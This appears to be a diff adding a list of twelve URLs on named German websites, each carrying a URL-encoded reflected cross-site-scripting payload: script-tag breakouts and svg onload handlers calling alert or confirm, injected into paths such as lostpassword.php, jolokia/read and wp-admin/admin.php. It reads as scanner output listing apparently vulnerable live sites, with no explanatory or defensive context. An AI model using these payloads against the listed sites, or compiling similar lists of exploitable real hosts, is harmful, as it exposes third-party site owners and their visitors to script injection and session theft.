@@ -1,0 +1,12 @@
+http://helltherm.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://henryhund.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://hensel-systemberatung.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://herz-igerl.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://hibernia-bund.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://hirt-verbindungstechnik.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+https://helmlechner.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+https://hennweb.de/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('2Xn0b6IQLUT6pfY1HZQPCqtqfFT')%3E
+https://herzogenaurach-kurier.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+https://herzogenrath-rundschau.de/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+https://hessischoldendorf-magazin.de/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+https://hkhgo.hotels-on-air.de/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
